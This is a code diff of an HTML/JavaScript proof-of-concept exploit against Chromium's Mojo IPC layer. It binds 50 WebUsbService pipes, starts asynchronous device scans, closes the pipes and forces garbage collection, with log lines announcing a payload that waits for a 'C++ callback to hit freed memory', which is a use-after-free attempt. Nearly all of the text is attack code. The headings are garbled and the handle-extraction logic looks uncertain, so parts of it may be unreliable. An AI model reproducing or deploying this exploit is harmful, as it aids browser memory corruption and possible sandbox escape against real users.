@@ -5,7 +5,7 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>Bypassing1 the Broker (Final Syntax)</h1>
+    <h1>Bypassing 9the Broker (Native Release)</h1>
     <script type="module">
         import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
@@ -19,26 +19,28 @@
             let services = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Create the remote
-                let usbServiceRemote = new WebUsbServiceRemote();
+                // 1. Create the remote and generate the receiver pipe
+                let remote = new WebUsbServiceRemote();
+                let receiver = remote.$.bindNewPipeAndPassReceiver();
                 
-                // 2. Generate the receiver pipe directly from the remote
-                let receiver = usbServiceRemote.$.bindNewPipeAndPassReceiver();
+                // 2. THE MAGIC BULLET: Extracting the native handle
+                // We strip the JS wrapper to hand the raw pointer to the C++ backend
+                let nativeHandle = receiver.handle;
+                if (typeof receiver.handle.release === 'function') {
+                    nativeHandle = receiver.handle.release();
+                }
                 
-                // 3. Ask the Broker for WebUsbService.
-                // In modern Chromium, the raw handle is hidden inside the receiver's $ object.
-                let rawHandle = receiver.$.handle;
-                
-                Mojo.bindInterface(WebUsbService.$interfaceName, rawHandle);
+                // 3. Bind to the Broker using the raw C++ handle
+                Mojo.bindInterface(WebUsbService.$interfaceName, nativeHandle);
 
-                services.push(usbServiceRemote);
+                services.push(remote);
             }
 
-            console.log("[+] Bound 50 WebUsbService pipes. Broker bypassed.");
+            console.log("[+] Bound 50 WebUsbService pipes. Native handles extracted.");
             console.log("[*] Triggering async hardware requests...");
             
             for(let s of services) {
-                // 4. Call GetDevices to initiate the async scan
+                // 4. Call GetDevices to initiate the async scan in C++
                 s.getDevices().catch(e => {}); 
             }
 
@@ -52,7 +54,7 @@
                 s.$.close();
             }
 
-            // 6. Force garbage collection in V8
+            // 6. Force garbage collection in V8 to reap the objects immediately
             if (window.gc) { window.gc(); }
 
             console.log("[?] Payload delivered. Waiting for C++ callback to hit freed memory...");
